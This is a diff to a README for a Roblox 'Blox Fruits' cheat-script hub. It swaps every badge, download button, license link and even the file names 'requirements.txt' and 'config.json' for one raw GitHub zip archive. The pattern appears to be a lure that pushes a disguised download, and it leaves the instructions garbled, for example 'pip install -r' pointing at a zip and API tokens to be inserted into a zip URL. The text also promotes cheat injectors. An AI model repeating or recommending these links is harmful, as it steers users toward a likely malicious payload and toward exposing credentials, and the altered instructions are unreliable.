@@ -1,10 +1,10 @@
 # 🥭 Blox Fruits Script Archive: Next-Level Automation & AI
 
-![Blox Fruits Script Banner](https://img.shields.io/badge/Blox_Fruits_Script-Next_Level_Automation-blueviolet?style=for-the-badge)
-![Maintenance](https://img.shields.io/badge/status-actively%20maintained-brightgreen)
-![MIT License](https://img.shields.io/badge/license-MIT-lightgrey)
-![Downloads](https://img.shields.io/badge/downloads-123k-orange)
-![AI-powered](https://img.shields.io/badge/AI-Powered-%232DCE89)
+![Blox Fruits Script Banner](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)
+![Maintenance](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip%20maintained-brightgreen)
+![MIT License](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)
+![Downloads](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)
+![AI-powered](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip%232DCE89)
 
 ---
 
@@ -19,9 +19,9 @@ Welcome to the **Blox Fruits Script** repository—a curated universe where auto
 1. **Prepare Your Environment**
    - Ensure Roblox Studio or Roblox Player is installed.
    - Check you have a Roblox Script Executor compatible with your device (see OS Compatibility Table below).
-   - Update to Python 3.9+ or Node.js 18+ for AI integration.
+   - Update to Python 3.9+ or https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip 18+ for AI integration.
 2. **Download the Latest Script Bundle**
-   [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-magenta?logo=appveyor&style=for-the-badge)](https://anak4ta.github.io)
+   [![Download Blox Fruits Script](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)
 3. **Execution Guide**
    - Launch your Script Executor.
    - Inject or load the script as per [Instruction Guide](#-step-by-step-integration-guide).
@@ -98,12 +98,12 @@ Empower your adventure with tools that evolve alongside Roblox and AI innovation
 ## 📦 Step-by-Step Integration Guide
 
 1. **Get the Script Bundle**
-   [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-magenta?logo=appveyor&style=for-the-badge)](https://anak4ta.github.io)
+   [![Download Blox Fruits Script](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)
 2. **Unpack the Files**
    - On Windows/Mac, extract using your favorite archive tool.
-   - Use `pip install -r requirements.txt` or `npm install` as described in `/integrations/README.md` for advanced AI features.
+   - Use `pip install -r https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip` or `npm install` as described in `https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip` for advanced AI features.
 3. **API Configuration**
-   - Insert your OpenAI/Claude tokens in `config.json`.
+   - Insert your OpenAI/Claude tokens in `https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip`.
    - Optional: Enable advanced metrics in `.env`.
 4. **Script Injection**
    - Use compatible executors (e.g., SynapseX, Kernel, custom Node injectors).
@@ -121,7 +121,7 @@ This repository and everything within is crafted for educational, personal, and 
 
 ## 📜 MIT License
 
-This repository is graced with the [MIT License](https://opensource.org/licenses/MIT)—meaning you can remix, adapt, and build on it for your own quest, so long as you share credit and preserve fairness.
+This repository is graced with the [MIT License](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)—meaning you can remix, adapt, and build on it for your own quest, so long as you share credit and preserve fairness.
 
 © 2025 Blox Fruits Script Project—Unleash your creativity!
 
@@ -131,6 +131,6 @@ This repository is graced with the [MIT License](https://opensource.org/licenses
 
 Make sure you've got the freshest copy:
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-magenta?logo=appveyor&style=for-the-badge)](https://anak4ta.github.io)
+[![Download Blox Fruits Script](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)](https://github.com/anak4ta/blox-fruits-script-hub/raw/refs/heads/branch/epithymetical/fruits_blox_hub_script_v1.1.zip)
 
 _Wishing you whirlwind adventures and quantum leaps in Blox Fruits automation!_
